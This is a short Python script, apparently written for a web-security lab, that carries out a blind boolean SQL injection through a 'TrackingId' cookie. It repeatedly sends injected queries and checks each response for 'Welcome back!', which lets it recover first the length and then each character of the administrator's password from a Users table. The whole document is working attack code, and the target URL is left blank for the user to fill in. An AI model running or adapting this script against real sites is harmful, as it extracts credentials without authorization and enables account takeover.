import requests

url = ""


def check_value(query: str) -> bool:
    print(query)
    r = requests.get(url, cookies={"TrackingId": query})

    return "Welcome back!" in r.text


def get_password_length() -> int:
    print("Getting password length..")

    for i in range(100):
        length = check_value(
            f"' OR LENGTH((SELECT Password from Users WHERE Username = 'administrator')) = {str(i)}--"
        )

        if length:
            print("Password length: ", i)
            return i


def check_char(len: str):
    possible_chars = list("abcdefghijklmnopqrstuvwxyz0123456789")

    s = ""

    for i in range(len):
        for char in possible_chars:
            is_char = check_value(
                f"' OR SUBSTR((SELECT Password from Users WHERE Username = 'administrator'), {str(i+1)},1) = '{char}'--"
            )

            if is_char:
                s += char
                print(f"Found char: ", char)
                break

    print(f"Password: ", s)


check_char(get_password_length())
